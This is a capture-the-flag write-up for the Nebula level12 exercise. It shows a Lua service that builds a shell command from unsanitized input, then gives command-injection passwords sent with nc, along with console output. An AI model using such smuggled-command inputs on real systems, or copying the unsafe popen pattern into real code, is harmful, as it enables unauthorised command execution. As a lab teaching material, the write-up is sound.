## Challenge
There is a backdoor process listening on port 50001.

To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12.

## Solution
```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
        prog = io.popen("echo "..password.." | sha1sum", "r")
        data = prog:read("*all")
        prog:close()

        data = string.sub(data, 1, 40)

        return data
end


while 1 do
        local client = server:accept()
        client:send("Password: ")
        client:settimeout(60)
        local line, err = client:receive()
        if not err then
                print("trying " .. line) -- log from where ;\
                local h = hash(line)

                if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
                        client:send("Better luck next time\n");
                else
                        client:send("Congrats, your token is 413**CARRIER LOST**\n")
                end

        end

        client:close()
end
```
So this program basically reads a password from the socket, `sha1`s it and compares to a given hash.

One of the properties of a hash function is irreversibility, in other words, you cannot find the input given a hash digest.

Although `sha1` is no longer considered a cryptographically sound hash function, finding a `hash-collision` is hard.

Can we find a easier way?

The approach taken to calculate the password's `sha1` is rather interesting...
```lua
prog = io.popen("echo "..password.." | sha1sum", "r")
```
String the given password to `echo`, pipe it to `sha1sum` and run.

No sanitization whatsoever... `command-injection` should do the job.
```shell
echo | getflag > /home/flag12/flagged | sha1sum
```
So password should be `| getflag > /home/flag12/flagged`.
```console
level12@nebula:/home/flag12$ nc 127.0.0.1 50001
Password: | getflag > /home/flag12/flagged
Better luck next time
level12@nebula:/home/flag12$ ls -la
total 10
drwxr-x--- 1 flag12 level12   60 2021-06-12 12:31 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12    59 2021-06-12 12:31 flagged
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
level12@nebula:/home/flag12$ cat flagged
You have successfully executed getflag on a target account
```

### Bonus
You can also trick the execution flow into thinking you calculated the correct hash.
```shell
echo 4754a4f4bd5787accd33de887b9250a0691dd198;# | sha1sum
```
But it seems to yield nothing interesting :P
```console
level12@nebula:/home/flag12$ nc 127.0.0.1 50001
Password: 4754a4f4bd5787accd33de887b9250a0691dd198;#
Congrats, your token is 413**CARRIER LOST**
```
